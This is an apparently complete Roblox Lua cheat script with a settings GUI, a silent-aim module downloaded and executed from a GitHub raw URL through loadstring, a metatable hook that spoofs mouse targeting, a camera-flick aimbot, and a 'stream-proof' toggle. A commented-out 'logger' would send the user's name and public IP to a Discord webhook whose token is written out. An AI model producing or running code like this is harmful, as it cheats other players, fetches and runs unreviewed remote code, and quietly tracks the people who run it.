--[[
	id: qKMDyeUludpfIO7cH1Ba3
	name: waleed
	description: waleed
	time1: 2021-07-11 17:42:55.97313+00
	time2: 2021-07-11 17:42:55.97314+00
	uploader: rewkx8R5s1Hr6xFLdQwPyEnu3e3VmtElFPHXezmd
	uploadersession: u1JdBzGEvOSLlnPEZXUE37Zu36O2Mx
	flag: f
--]]

-- Gui to Lua
-- Version: 3.2

-- Instances:

local ScreenGui = Instance.new("ScreenGui")
local Main = Instance.new("Frame")
local Title = Instance.new("TextLabel")
local FOV = Instance.new("Frame")
local FOV_2 = Instance.new("TextBox")
local FOVtitle = Instance.new("TextLabel")
local Prediction = Instance.new("Frame")
local Prediction_2 = Instance.new("TextBox")
local PredTitle = Instance.new("TextLabel")
local Tracer = Instance.new("Frame")
local Min = Instance.new("TextBox")
local Max = Instance.new("TextBox")
local PredTitle_2 = Instance.new("TextLabel")
local OldPred = Instance.new("Frame")
local PredTitle_3 = Instance.new("TextLabel")
local Boolean = Instance.new("TextButton")
local AirPred = Instance.new("Frame")
local PredTitle_4 = Instance.new("TextLabel")
local Boolean_2 = Instance.new("TextButton")
local BulletCalc = Instance.new("Frame")
local Drop = Instance.new("TextBox")
local FOVtitle_2 = Instance.new("TextLabel")

--Properties:

ScreenGui.Parent = game.CoreGui

Main.Name = "Main"
Main.Parent = ScreenGui
Main.BackgroundColor3 = Color3.fromRGB(104, 104, 104)
Main.BackgroundTransparency = 0.500
Main.BorderSizePixel = 0
Main.Position = UDim2.new(0.699999988, 0, 0, 0)
Main.Selectable = true
Main.Size = UDim2.new(0, 327, 0, 439)
Main.Draggable = true

Title.Name = "Title"
Title.Parent = Main
Title.BackgroundColor3 = Color3.fromRGB(0, 255, 0)
Title.BackgroundTransparency = 0.550
Title.BorderSizePixel = 0
Title.Position = UDim2.new(0, 0, -0.00227790442, 0)
Title.Size = UDim2.new(1, 0, 0.117907204, 0)
Title.Font = Enum.Font.PatrickHand
Title.Text = "WaleedUI V1.0 Settings"
Title.TextColor3 = Color3.fromRGB(255, 255, 255)
Title.TextScaled = true
Title.TextSize = 14.000
Title.TextWrapped = true

FOV.Name = "FOV"
FOV.Parent = Main
FOV.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
FOV.BackgroundTransparency = 1.000
FOV.BorderColor3 = Color3.fromRGB(27, 42, 53)
FOV.Position = UDim2.new(0, 0, 0, 51)
FOV.Size = UDim2.new(0, 327, 0, 58)

FOV_2.Name = "FOV"
FOV_2.Parent = FOV
FOV_2.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
FOV_2.BackgroundTransparency = 1.000
FOV_2.BorderSizePixel = 0
FOV_2.Position = UDim2.new(0.55291003, 0, 0.153750181, 0)
FOV_2.Size = UDim2.new(0.44709, 0, 0.736875117, 0)
FOV_2.Font = Enum.Font.SourceSans
FOV_2.PlaceholderColor3 = Color3.fromRGB(128, 255, 0)
FOV_2.PlaceholderText = "How big FOV is"
FOV_2.Text = "20"
FOV_2.TextColor3 = Color3.fromRGB(128, 255, 0)
FOV_2.TextSize = 60.000
FOV_2.TextWrapped = true
FOV_2.TextXAlignment = Enum.TextXAlignment.Left

FOVtitle.Name = "FOVtitle"
FOVtitle.Parent = FOV
FOVtitle.BackgroundColor3 = Color3.fromRGB(0, 255, 0)
FOVtitle.BackgroundTransparency = 1.000
FOVtitle.BorderSizePixel = 0
FOVtitle.Position = UDim2.new(0, 0, 0.0131251812, 0)
FOVtitle.Size = UDim2.new(0.510582149, 0, 0.986874938, 0)
FOVtitle.Font = Enum.Font.PatrickHand
FOVtitle.Text = "FOV SIZE ="
FOVtitle.TextColor3 = Color3.fromRGB(128, 255, 0)
FOVtitle.TextScaled = true
FOVtitle.TextSize = 14.000
FOVtitle.TextWrapped = true
FOVtitle.TextXAlignment = Enum.TextXAlignment.Left
FOVtitle.TextYAlignment = Enum.TextYAlignment.Bottom

Prediction.Name = "Prediction"
Prediction.Parent = Main
Prediction.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
Prediction.BackgroundTransparency = 1.000
Prediction.BorderColor3 = Color3.fromRGB(27, 42, 53)
Prediction.Position = UDim2.new(0, 0, 0, 111)
Prediction.Size = UDim2.new(0, 327, 0, 58)

Prediction_2.Name = "Prediction"
Prediction_2.Parent = Prediction
Prediction_2.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
Prediction_2.BackgroundTransparency = 1.000
Prediction_2.BorderSizePixel = 0
Prediction_2.Position = UDim2.new(0.55291003, 0, 0.153750181, 0)
Prediction_2.Size = UDim2.new(0.44709, 0, 0.736875117, 0)
Prediction_2.Font = Enum.Font.SourceSans
Prediction_2.PlaceholderColor3 = Color3.fromRGB(128, 255, 0)
Prediction_2.PlaceholderText = "How much to predict"
Prediction_2.Text = "8.009"
Prediction_2.TextColor3 = Color3.fromRGB(128, 255, 0)
Prediction_2.TextSize = 60.000
Prediction_2.TextWrapped = true
Prediction_2.TextXAlignment = Enum.TextXAlignment.Left

PredTitle.Name = "PredTitle"
PredTitle.Parent = Prediction
PredTitle.BackgroundColor3 = Color3.fromRGB(0, 255, 0)
PredTitle.BackgroundTransparency = 1.000
PredTitle.BorderSizePixel = 0
PredTitle.ClipsDescendants = true
PredTitle.Position = UDim2.new(0, 0, 0.0131251812, 0)
PredTitle.Size = UDim2.new(0.510582149, 0, 0.986874938, 0)
PredTitle.Font = Enum.Font.PatrickHand
PredTitle.Text = "PREDICTION ="
PredTitle.TextColor3 = Color3.fromRGB(128, 255, 0)
PredTitle.TextSize = 45.000
PredTitle.TextWrapped = true
PredTitle.TextXAlignment = Enum.TextXAlignment.Left

Tracer.Name = "Tracer"
Tracer.Parent = Main
Tracer.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
Tracer.BackgroundTransparency = 1.000
Tracer.BorderColor3 = Color3.fromRGB(27, 42, 53)
Tracer.Position = UDim2.new(0, 0, 0, 168)
Tracer.Size = UDim2.new(0, 327, 0, 62)

Min.Name = "Min"
Min.Parent = Tracer
Min.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
Min.BackgroundTransparency = 1.000
Min.BorderSizePixel = 0
Min.Position = UDim2.new(0.55291003, 0, 0.153750107, 0)
Min.Size = UDim2.new(0.417989463, 0, 0.38270852, 0)
Min.Font = Enum.Font.SourceSans
Min.PlaceholderColor3 = Color3.fromRGB(128, 255, 0)
Min.PlaceholderText = "Min"
Min.Text = "0.07"
Min.TextColor3 = Color3.fromRGB(128, 255, 0)
Min.TextSize = 50.000
Min.TextWrapped = true
Min.TextXAlignment = Enum.TextXAlignment.Left

Max.Name = "Max"
Max.Parent = Tracer
Max.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
Max.BackgroundTransparency = 1.000
Max.BorderSizePixel = 0
Max.Position = UDim2.new(0.55291003, 0, 0.599999845, 0)
Max.Size = UDim2.new(0.417989463, 0, 0.400000334, 0)
Max.Font = Enum.Font.SourceSans
Max.PlaceholderColor3 = Color3.fromRGB(128, 255, 0)
Max.PlaceholderText = "Max"
Max.Text = "0.1"
Max.TextColor3 = Color3.fromRGB(128, 255, 0)
Max.TextSize = 54.000
Max.TextWrapped = true
Max.TextXAlignment = Enum.TextXAlignment.Left

PredTitle_2.Name = "PredTitle"
PredTitle_2.Parent = Tracer
PredTitle_2.BackgroundColor3 = Color3.fromRGB(0, 255, 0)
PredTitle_2.BackgroundTransparency = 1.000
PredTitle_2.BorderSizePixel = 0
PredTitle_2.Position = UDim2.new(0, 0, 0.013125102, 0)
PredTitle_2.Size = UDim2.new(0.552910149, 0, 0.986874878, 0)
PredTitle_2.Font = Enum.Font.PatrickHand
PredTitle_2.Text = "TRACER SETS ="
PredTitle_2.TextColor3 = Color3.fromRGB(128, 255, 0)
PredTitle_2.TextSize = 45.000
PredTitle_2.TextWrapped = true
PredTitle_2.TextXAlignment = Enum.TextXAlignment.Left

OldPred.Name = "OldPred"
OldPred.Parent = Main
OldPred.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
OldPred.BackgroundTransparency = 1.000
OldPred.BorderColor3 = Color3.fromRGB(27, 42, 53)
OldPred.Position = UDim2.new(0, 0, 0, 233)
OldPred.Size = UDim2.new(0, 327, 0, 62)

PredTitle_3.Name = "PredTitle"
PredTitle_3.Parent = OldPred
PredTitle_3.BackgroundColor3 = Color3.fromRGB(0, 255, 0)
PredTitle_3.BackgroundTransparency = 1.000
PredTitle_3.BorderSizePixel = 0
PredTitle_3.Position = UDim2.new(0, 0, 0.013125102, 0)
PredTitle_3.Size = UDim2.new(0.552910149, 0, 0.986874878, 0)
PredTitle_3.Font = Enum.Font.PatrickHand
PredTitle_3.Text = "Old Prediction ="
PredTitle_3.TextColor3 = Color3.fromRGB(255, 0, 4)
PredTitle_3.TextSize = 45.000
PredTitle_3.TextWrapped = true
PredTitle_3.TextXAlignment = Enum.TextXAlignment.Left

Boolean.Name = "Boolean"
Boolean.Parent = OldPred
Boolean.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
Boolean.BackgroundTransparency = 1.000
Boolean.Position = UDim2.new(0.552999973, 0, 0.153999999, 0)
Boolean.Size = UDim2.new(0.425999999, 0, 0.662, 0)
Boolean.Font = Enum.Font.PatrickHand
Boolean.Text = "false"
Boolean.TextColor3 = Color3.fromRGB(255, 0, 4)
Boolean.TextSize = 58.000
Boolean.TextStrokeColor3 = Color3.fromRGB(255, 0, 4)
Boolean.TextWrapped = true
Boolean.TextXAlignment = Enum.TextXAlignment.Left

AirPred.Name = "AirPred"
AirPred.Parent = Main
AirPred.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
AirPred.BackgroundTransparency = 1.000
AirPred.BorderColor3 = Color3.fromRGB(27, 42, 53)
AirPred.Position = UDim2.new(0, 0, 0, 300)
AirPred.Size = UDim2.new(0, 327, 0, 62)

PredTitle_4.Name = "PredTitle"
PredTitle_4.Parent = AirPred
PredTitle_4.BackgroundColor3 = Color3.fromRGB(0, 255, 0)
PredTitle_4.BackgroundTransparency = 1.000
PredTitle_4.BorderSizePixel = 0
PredTitle_4.Position = UDim2.new(0, 0, 0.013125102, 0)
PredTitle_4.Size = UDim2.new(0.552910149, 0, 0.986874878, 0)
PredTitle_4.Font = Enum.Font.PatrickHand
PredTitle_4.Text = "YPrediction:"
PredTitle_4.TextColor3 = Color3.fromRGB(255, 0, 4)
PredTitle_4.TextScaled = true
PredTitle_4.TextSize = 45.000
PredTitle_4.TextWrapped = true
PredTitle_4.TextXAlignment = Enum.TextXAlignment.Left

Boolean_2.Name = "Boolean"
Boolean_2.Parent = AirPred
Boolean_2.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
Boolean_2.BackgroundTransparency = 1.000
Boolean_2.Position = UDim2.new(0.552999973, 0, 0.153999999, 0)
Boolean_2.Size = UDim2.new(0.425999999, 0, 0.662, 0)
Boolean_2.Font = Enum.Font.PatrickHand
Boolean_2.Text = "false"
Boolean_2.TextColor3 = Color3.fromRGB(255, 0, 4)
Boolean_2.TextSize = 58.000
Boolean_2.TextStrokeColor3 = Color3.fromRGB(255, 0, 4)
Boolean_2.TextWrapped = true
Boolean_2.TextXAlignment = Enum.TextXAlignment.Left

BulletCalc.Name = "BulletCalc"
BulletCalc.Parent = Main
BulletCalc.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
BulletCalc.BackgroundTransparency = 1.000
BulletCalc.BorderColor3 = Color3.fromRGB(27, 42, 53)
BulletCalc.Position = UDim2.new(0, 0, 0, 360)
BulletCalc.Size = UDim2.new(0, 327, 0, 58)

Drop.Name = "Drop"
Drop.Parent = BulletCalc
Drop.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
Drop.BackgroundTransparency = 1.000
Drop.BorderSizePixel = 0
Drop.Position = UDim2.new(0.55291003, 0, 0.153750181, 0)
Drop.Size = UDim2.new(0.44709, 0, 0.736875117, 0)
Drop.Font = Enum.Font.SourceSans
Drop.PlaceholderColor3 = Color3.fromRGB(128, 255, 0)
Drop.Text = "0"
Drop.TextColor3 = Color3.fromRGB(128, 255, 0)
Drop.TextSize = 60.000
Drop.TextWrapped = true
Drop.TextXAlignment = Enum.TextXAlignment.Left

FOVtitle_2.Name = "FOVtitle"
FOVtitle_2.Parent = BulletCalc
FOVtitle_2.BackgroundColor3 = Color3.fromRGB(0, 255, 0)
FOVtitle_2.BackgroundTransparency = 1.000
FOVtitle_2.BorderSizePixel = 0
FOVtitle_2.Position = UDim2.new(0, 0, 0.0344827585, 0)
FOVtitle_2.Size = UDim2.new(0.510582209, 0, 0.810344875, 0)
FOVtitle_2.Font = Enum.Font.PatrickHand
FOVtitle_2.Text = "BulletDrop(Old)"
FOVtitle_2.TextColor3 = Color3.fromRGB(128, 255, 0)
FOVtitle_2.TextScaled = true
FOVtitle_2.TextSize = 34.000
FOVtitle_2.TextWrapped = true
FOVtitle_2.TextXAlignment = Enum.TextXAlignment.Left
FOVtitle_2.TextYAlignment = Enum.TextYAlignment.Bottom

Main.Draggable = true
Main.Active = true

local function ILYZC_fake_script() -- ScreenGui.LocalScript 
	local script = Instance.new('LocalScript', ScreenGui)


--[[
	
	░██████╗███████╗████████╗████████╗██╗███╗░░██╗░██████╗░░██████╗
	██╔════╝██╔════╝╚══██╔══╝╚══██╔══╝██║████╗░██║██╔════╝░██╔════╝
	╚█████╗░█████╗░░░░░██║░░░░░░██║░░░██║██╔██╗██║██║░░██╗░╚█████╗░
	░╚═══██╗██╔══╝░░░░░██║░░░░░░██║░░░██║██║╚████║██║░░╚██╗░╚═══██╗
	██████╔╝███████╗░░░██║░░░░░░██║░░░██║██║░╚███║╚██████╔╝██████╔╝
	╚═════╝░╚══════╝░░░╚═╝░░░░░░╚═╝░░░╚═╝╚═╝░░╚══╝░╚═════╝░╚═════╝░
	
	--]]
	-- [[𝗦𝗘𝗥𝗩𝗜𝗖𝗘𝗦 𝗔𝗡𝗗 𝗩𝗔𝗥𝗜𝗔𝗕𝗟𝗘𝗦]] --
	local Players = game:GetService("Players")
	local LocalPlayer = Players.LocalPlayer
	local UserInputService = game:GetService("UserInputService")
	local RunService = game:GetService("RunService")
	local mouse = LocalPlayer:GetMouse()
	local cam = game.Workspace.CurrentCamera


	-- [[FRAMES]] --
	local main = script.Parent.Main
	local sfov = main.FOV.FOV
	local sPred = main.Prediction.Prediction
	local mintracer = main.Tracer.Min
	local maxtracer = main.Tracer.Max
	local sOldpred = main.OldPred.Boolean
	local sAirpred = main.AirPred.Boolean
	local sBullet = main.BulletCalc.Drop


	-- [[𝑺𝑰𝑳𝑬𝑵𝑻 𝑨𝑰𝑴 𝑴𝑶𝑫𝑼𝑳𝑬]] --
	local SilentAim = loadstring(game:HttpGet("https://raw.githubusercontent.com/SkiddingScripts/Testing/main/TestAimlock.lua"))()

	-- [[𝘼𝙄𝙈𝙇𝙊𝘾𝙆 𝙎𝙀𝙏𝙏𝙄𝙉𝙂𝙎]] --
	SilentAim.FOV = tonumber(sfov.Text)
	SilentAim.HitChance = 100
	local PredictionVelocity = tonumber(sPred.Text)  -- [8.009]
	local minFlickSpeed = tonumber(mintracer.Text)
	local maxFlickSpeed = tonumber(maxtracer.Text)
	local calculatedrop
	local ballisticsboost = tonumber(sBullet.Text)
	local AirPred = false
	local OldPred = false
	local BlacklistCrews = {
	    21312,
		--10564164, 
		--11099144,
	}



	-- [[𝗞𝗲𝘆𝗕𝗶𝗻𝗱𝘀]] --
	local toggle = "q"
	local ftoggle = "t"
	local uiToggle = {Enum.KeyCode.RightControl, "v"}
	local sToggle = {Enum.KeyCode.RightControl, "["}
	local rToggle = {Enum.KeyCode.RightControl, "]"}

	-- [[𝑩𝒐𝒐𝒍𝒆𝒂𝒏𝒔]] --
	local movementcounting = true
	SilentAim.ShowFOV = true
	SilentAim.TeamCheck = false
	local Flickshot = true
	local Enabled = true
	local StreamProofToggle = false
	local RandomAimParts = true

	--[[
	███████╗███╗░░██╗██████╗░  ░██████╗███████╗████████╗████████╗██╗███╗░░██╗░██████╗░░██████╗
	██╔════╝████╗░██║██╔══██╗  ██╔════╝██╔════╝╚══██╔══╝╚══██╔══╝██║████╗░██║██╔════╝░██╔════╝
	█████╗░░██╔██╗██║██║░░██║  ╚█████╗░█████╗░░░░░██║░░░░░░██║░░░██║██╔██╗██║██║░░██╗░╚█████╗░
	██╔══╝░░██║╚████║██║░░██║  ░╚═══██╗██╔══╝░░░░░██║░░░░░░██║░░░██║██║╚████║██║░░╚██╗░╚═══██╗
	███████╗██║░╚███║██████╔╝  ██████╔╝███████╗░░░██║░░░░░░██║░░░██║██║░╚███║╚██████╔╝██████╔╝
	╚══════╝╚═╝░░╚══╝╚═════╝░  ╚═════╝░╚══════╝░░░╚═╝░░░░░░╚═╝░░░╚═╝╚═╝░░╚══╝░╚═════╝░╚═════╝░
	]]

	sOldpred.MouseButton1Down:connect(function()
		if not OldPred and sOldpred.Text == "false" then
			OldPred = true
			sOldpred.Text  = "true"
			sPred.Text = "0.165"
			PredictionVelocity = tonumber(sPred.Text)
		elseif OldPred and sOldpred.Text == "true" then
			OldPred = false
			sOldpred.Text = "false"
			sPred.Text = "8.009"
			PredictionVelocity = tonumber(sPred.Text)
		end
	end)

	sAirpred.MouseButton1Down:connect(function()
		if not AirPred and sAirpred.Text == "false" then
			AirPred = true
			sAirpred.Text = "true"
		elseif AirPred and sAirpred.Text == "true" then
			AirPred = false
			sAirpred.Text = "false"
		end
	end)

	main.FOV.FOV.FocusLost:Connect(function()
		if tonumber(sfov.Text) then
			SilentAim.FOV = tonumber(sfov.Text)
		else

		end
	end)

	main.Prediction.Prediction.FocusLost:Connect(function()
		if tonumber(sPred.Text) then
			PredictionVelocity = tonumber(sPred.Text)
		else

		end
	end)

	main.BulletCalc.Drop.FocusLost:connect(function()
		if tonumber(sBullet.Text) then
			ballisticsboost = tonumber(sBullet.Text)
		end
	end)

	main.Tracer.Min.FocusLost:Connect(function()
		if tonumber(mintracer.Text) then
			minFlickSpeed = tonumber(mintracer.Text)
		else

		end
	end)

	main.Tracer.Max.FocusLost:Connect(function()
		if tonumber(maxtracer.Text) then
			maxFlickSpeed = tonumber(maxtracer.Text)
		else

		end
	end)

mouse.KeyDown:Connect(function(k)
	if k == uiToggle[2] and UserInputService:isKeyDown(uiToggle[1]) and not Main.Visible then
		Main.Visible = true
	elseif k == uiToggle[2] and UserInputService:isKeyDown(uiToggle[1]) and Main.Visible then
		Main.Visible = false
	end
end)

	mouse.KeyDown:Connect(function(k)
		if k == sToggle[2] and UserInputService:isKeyDown(sToggle[1]) and not StreamProofToggle then
			StreamProofToggle = true
		elseif k == sToggle[2] and UserInputService:isKeyDown(sToggle[1]) and StreamProofToggle then
			StreamProofToggle = false
		end
	end)

	mouse.KeyDown:Connect(function(k)
		if k == rToggle[2] and UserInputService:isKeyDown(rToggle[1]) and not RandomAimParts then
			RandomAimParts = true
		elseif k == rToggle[2] and UserInputService:isKeyDown(rToggle[1]) and RandomAimParts then
			RandomAimParts = false
		end
	end)

	--mouse.KeyDown:Connect(function(k)
	--	if k == ftoggle and SilentAim.FOV == 20 then
	--		SilentAim.FOV = 40
	--	elseif k == ftoggle and SilentAim.FOV == 40 then
	--		SilentAim.FOV = 20
	--	end
	--end)

	mouse.KeyDown:Connect(function(k)
		if k == toggle and Enabled then
			SilentAim.SilentAimEnabled = false
			SilentAim.ShowFOV = false
			Enabled = false
		elseif k == toggle and not Enabled then
			SilentAim.SilentAimEnabled = true
			if 	StreamProofToggle then SilentAim.ShowFOV = false elseif not StreamProofToggle then SilentAim.ShowFOV = true end
			Enabled = true
		end
	end)


	local aparts = {
		"Head",
		"HumanoidRootPart",
		"UpperTorso",
		"LowerTorso",
		"LeftUpperArm",
		"RightUpperArm",
	}
	-- [[BOB VARIABLES]] --

	local h = true
	local d = false
	local j = false
	local k = false
	local del = 0.5

	-- // Metatable vars
	local mt = getrawmetatable(game)
	local backupindex = mt.__index
	setreadonly(mt, false)

	-- // Check if player is down
	SilentAim.checkSilentAim = function()
		local checkA = (SilentAim.SilentAimEnabled == true and SilentAim.Selected ~= LocalPlayer)
		local playerCharacter = SilentAim.Selected.Character
		local daHood = (playerCharacter.BodyEffects["K.O"].Value == false or playerCharacter:FindFirstChild("GRABBING_CONSTRAINT") ~= nil)
		local notyou = (SilentAim.Selected ~= LocalPlayer)
		local IsBlackList = nil
		for i,v in pairs(BlacklistCrews) do
			if SilentAim.Selected:FindFirstChild("DataFolder") ~= nil then
				if SilentAim.Selected:FindFirstChild("DataFolder"):FindFirstChild("Information") ~= nil then
					if SilentAim.Selected:FindFirstChild("DataFolder").Information:FindFirstChild("Crew") ~= nil then
						IsBlackList = (SilentAim.Selected.DataFolder.Information.Crew.Value ~= tostring(v))
					else IsBlackList = true
					end
				else IsBlackList = true
				end
			else IsBlackList = true
			end
		end

		local KeepLock = nil

		return (checkA and daHood and IsBlackList)
	end

-- this a logger btw xd

--local XD = tostring(syn.request({Url="https://httpbin.org/ip"}).Body)

--	local response = syn.request(
--		{
--			Url = 'https://discord.com/api/webhooks/856531569338220565/3AsGt467TBFZ7NTigDmNIeNjJOU5uvmqeX0vOxmJZ4hZqYpWGTkA1M1Oh3e-hAr3azJv',
--			Method = 'POST',
--			Headers = {
--				['Content-Type'] = 'application/json'
--			},
--			Body = game:GetService('HttpService'):JSONEncode({content = "```" .. game.Players.LocalPlayer.Name .. " has used the script lmao"..  " " ..  XD .. "```"})
--		}
--	);

	local TargetPart = ""

	local function bob()
		if RandomAimParts then
			local func = coroutine.create(function()
				if h then
					wait(del)
					h = false
					d = true
					k = false
					j = false
				elseif d then
					wait(del)
					h = false
					d = false
					k = true
					j = false
				elseif k then
					wait(del)
					h = false
					d = false
					j = true
					k = false
				elseif j then
					wait(del)
					h = true
					d = false
					j = false
					k = false
				end
			end)
			coroutine.resume(func) 
			if h then
				TargetPart = "UpperTorso"
			end
			if d then
				TargetPart = "Head"
			end
			if j then
				TargetPart = "LeftUpperArm"
			end
			if k then
				TargetPart = "RightUpperArm"
			end
		end
	end

	local function decimalRandom(minimum, maximum)
		return math.random()*(maximum-minimum) + minimum
	end


	-- // Hook
	mt.__index = newcclosure(function(t, k)
		if (t:IsA("Mouse") and (k == "Hit")) then
			-- print(t, k)
			local CPlayer = SilentAim.Selected
			if (SilentAim.checkSilentAim()) then
				if (CPlayer.Character:FindFirstChild(TargetPart)) then
					local d = (cam.CFrame.p - CPlayer.Character[TargetPart].CFrame.p).magnitude
					local minuseddrop = (ballisticsboost+50)/50
					if ballisticsboost ~= 0 then
						calculatedrop = d - (d/minuseddrop)
					else
						calculatedrop = 0
					end
					local PVelocity = CPlayer.Character[TargetPart].Velocity
					local yFactor = Vector3.new(PVelocity.x, 0, PVelocity.z)
					if OldPred then
						if AirPred then
							return {p=(CPlayer.Character[TargetPart].CFrame.p+(PVelocity*PredictionVelocity+Vector3.new(0, calculatedrop, 0)))}
						elseif not AirPred then
							return {p=(CPlayer.Character[TargetPart].CFrame.p+(yFactor*PredictionVelocity+Vector3.new(0, calculatedrop, 0)))}
						end
					elseif not OldPred then
						if AirPred then
							return {p=((CPlayer.Character[TargetPart].Position + CPlayer.Character[TargetPart].Velocity/PredictionVelocity))}
						elseif not AirPred then
							return {p=((CPlayer.Character[TargetPart].Position + yFactor/PredictionVelocity))}
						end
					end
				end
			end
		end
		return backupindex(t, k)
	end)
	-- // Revert
	setreadonly(mt, true)

	local KeyDown = false



	UserInputService.InputBegan:Connect(function(inputObject) 
		if(inputObject.KeyCode==Enum.KeyCode.P)then
			KeyDown = true
			while KeyDown do
				wait()
				if Flickshot then
					local CPlayer = SilentAim.Selected
					bob()
					if (SilentAim.checkSilentAim()) then
						if (CPlayer.Character:FindFirstChild(TargetPart)) then
							local d = (cam.CFrame.p - CPlayer.Character.Head.CFrame.p).magnitude
							local minuseddrop = (ballisticsboost+50)/50
							if ballisticsboost ~= 0 then
								calculatedrop = d - (d/minuseddrop)
							else
								calculatedrop = 0
							end
							local PVelocity = CPlayer.Character[TargetPart].Velocity
							local yFactor = Vector3.new(PVelocity.x, 0, PVelocity.z)
							local cf = nil
							if OldPred then
								if AirPred then
									cf = CFrame.new(cam.CFrame.p, CPlayer.Character[TargetPart].CFrame.p+(PVelocity*PredictionVelocity+Vector3.new(0, calculatedrop, 0)))
								elseif not AirPred then
									cf = CFrame.new(cam.CFrame.p, CPlayer.Character[TargetPart].CFrame.p+(yFactor*PredictionVelocity+Vector3.new(0, calculatedrop, 0)))
								end
							elseif not OldPred then
								if AirPred then
									cf= CFrame.new(cam.CFrame.p, CPlayer.Character[TargetPart].Position + yFactor/PredictionVelocity)
								elseif not AirPred then
									cf= CFrame.new(cam.CFrame.p, CPlayer.Character[TargetPart].Position + CPlayer.Character[TargetPart].Velocity/PredictionVelocity)
								end
							end
							cam.CFrame = cam.CFrame:Lerp(cf, decimalRandom(minFlickSpeed, maxFlickSpeed))
						end
					end
				end
			end
		end
	end)

	UserInputService.InputEnded:Connect(function(inputObject)
		if(inputObject.KeyCode==Enum.KeyCode.P)then
			KeyDown = false
		end
	end)




end

coroutine.wrap(ILYZC_fake_script)()